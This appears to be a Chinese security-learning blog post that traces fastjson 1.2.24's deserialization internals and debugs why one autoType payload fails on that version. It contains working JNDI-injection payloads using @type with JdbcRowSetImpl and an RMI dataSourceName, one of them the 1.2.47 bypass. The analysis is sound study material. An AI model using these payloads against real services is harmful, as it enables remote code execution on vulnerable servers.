---
layout: post
title: "fastjson 1.2.24反序列化过程学习"
date: 2020-09-06 21:22:23 +0800
categories: java
---

本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧

分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松

------

调试用的代码

```java
        String jsonString = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/adas\",\"autoCommit\":true}}";
        Group group = JSON.parseObject(jsonString, Group.class);
```

从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner

## JSONScanner

JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部

JSONLexerBase有几个成员变量

```java
    protected int                            token;
    protected int                            pos;
    protected int                            features;

    protected char                           ch;
    protected int                            bp;//当前指向的位置

    protected int                            eofPos;
    /**
     * A character buffer for literals.
     */
    protected char[]                         sbuf;
    protected int                            sp;

    /**
     * number start position
     */
    protected int                            np;
```

同时JSONScanner也新定义了两个

```java
private final String text; //反序列化的字符串
private final int    len;//字符串长度
```

```java
//将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符   
public final char next() {
        int index = ++bp;
        return ch = (index >= this.len ? //
            EOI //
            : text.charAt(index));
    }
```

JSONScanner的初始化

```java
    public JSONScanner(String input, int features){
        super(features);

        text = input;
        len = text.length();
        bp = -1;

        next();
        if (ch == 65279) { // utf-8 bom
            next();
        }
    }
```

## DefaultJSONParser

不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化

在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建

![](/assets/images/image-20200801153731844.png)

进入这个函数

```java
 public ObjectDeserializer getDeserializer(Type type) {
     //首先会在已有的deserializer中找，this.derializers是一个hashmap
        ObjectDeserializer derializer = this.derializers.get(type);
        if (derializer != null) {
            return derializer;
        }
     //没有找着就接着找
        if (type instanceof Class<?>) {
            return getDeserializer((Class<?>) type, type);
        }
………………省略……………………
    }
```

进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中

```java
    public ObjectDeserializer getDeserializer(Class<?> clazz, Type type) {
        //继续匹配
        ObjectDeserializer derializer = derializers.get(type);
        if (derializer != null) {
            return derializer;
        }

        if (type == null) {
            type = clazz;
        }
        //继续匹配
        derializer = derializers.get(type);
        if (derializer != null) {
            return derializer;
        }

        {
            JSONType annotation = clazz.getAnnotation(JSONType.class);
            if (annotation != null) {
                Class<?> mappingTo = annotation.mappingTo();
                if (mappingTo != Void.class) {
                    return getDeserializer(mappingTo, mappingTo);
                }
            }
        }
//判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道
        if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) {
            derializer = derializers.get(clazz);
        }

        if (derializer != null) {
            return derializer;
        }
//反序列化的类是否在denyList中
        String className = clazz.getName();
        className = className.replace('$', '.');
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("parser deny : " + className);
            }
        }
```

之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer

![](/assets/images/image-20200801155439336.png)

createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer

![](/assets/images/image-20200801175636270.png)

如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false

![](/assets/images/image-20200801171446495.png)

先跟进asm为false的情况，直接new一个JavaBeanDeserializer

## JavaBeanDeserializer

```java
    //其中定义的一些成员变量
	private final FieldDeserializer[]   fieldDeserializers;
    protected final FieldDeserializer[] sortedFieldDeserializers;
    protected final Class<?>            clazz;
    public final JavaBeanInfo           beanInfo;
    private ConcurrentMap<String, Object> extraFieldDeserializers;
```

com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法

![](/assets/images/image-20200801162230691.png)

最后返回一个JavaBeanInfo类

![](/assets/images/image-20200801162539536.png)

在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields

```java
public JavaBeanInfo(Class<?> clazz, //
                        Class<?> builderClass, //
                        Constructor<?> defaultConstructor, //
                        Constructor<?> creatorConstructor, //
                        Method factoryMethod, //
                        Method buildMethod, //
                        JSONType jsonType, //
                        List<FieldInfo> fieldList){
        this.clazz = clazz;
        this.builderClass = builderClass;
        this.defaultConstructor = defaultConstructor;
        this.creatorConstructor = creatorConstructor;
        this.factoryMethod = factoryMethod;
        this.parserFeatures = TypeUtils.getParserFeatures(clazz);
        this.buildMethod = buildMethod;

    ....省略.....

        fields = new FieldInfo[fieldList.size()];
        fieldList.toArray(fields);

        FieldInfo[] sortedFields = new FieldInfo[fields.length];
        System.arraycopy(fields, 0, sortedFields, 0, fields.length);
        Arrays.sort(sortedFields);

    ....省略.....
   
    }
```

在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中

![](/assets/images/image-20200801170946844.png)

至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化

![](/assets/images/image-20200801172125235.png)
fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349

从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值

![](/assets/images/image-20200801172503527.png)

当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理

![](/assets/images/image-20200801172650015.png)

![](/assets/images/image-20200801172727278.png)

之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object)

判断当前指向的符号，如果是"{"则创建一个JSONObject继续解析

![](/assets/images/image-20200801174009759.png)

当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载

![](/assets/images/image-20200801173758418.png)

com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)

![](/assets/images/image-20200801173855503.png)

之后会根据clazz获取deserializer进行反序列化

![](/assets/images/image-20200801174629869.png)

用asm来生成处理类的情况：

也就是当asmEnable为true的情况

![](/assets/images/image-20200801180314902.png)

截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了

![](/assets/images/image-20200801202503290.png)

## 为什么要有autoType功能

在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问

https://github.com/alibaba/fastjson/issues/3218

当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息



## 遇到的问题

测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功

使用payload1

```java
String jsonString = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/adas\",\"autoCommit\":true}}";
```

会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1

调用栈

```
popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser)
parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:243, JSON (com.alibaba.fastjson)
parseObject:456, JSON (com.alibaba.fastjson)
main:41, test (test)
```

看了一下，是因为执行这条语句是contextArrayIndex为0导致的

![](/assets/images/image-20200801205641550.png)

经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是

- {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}
- {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/adas\",\"autoCommit\":true}

所以导致数组越界



再调试另一种payload

```java
String jsonString = "{\"name\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/adas\",\"autoCommit\":true}}";
```

少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在

deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)

下面是调用堆栈

```
addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser)
setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:105, StringCodec (com.alibaba.fastjson.serializer)
deserialze:87, StringCodec (com.alibaba.fastjson.serializer)
parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:243, JSON (com.alibaba.fastjson)
parseObject:456, JSON (com.alibaba.fastjson)
main:41, test (test)
```

所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错

感觉像是代码的bug



验证：

通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败

1.2.47：

![](/assets/images/image-20200801233523275.png)

1.2.24：

![](/assets/images/image-20200801233548941.png)

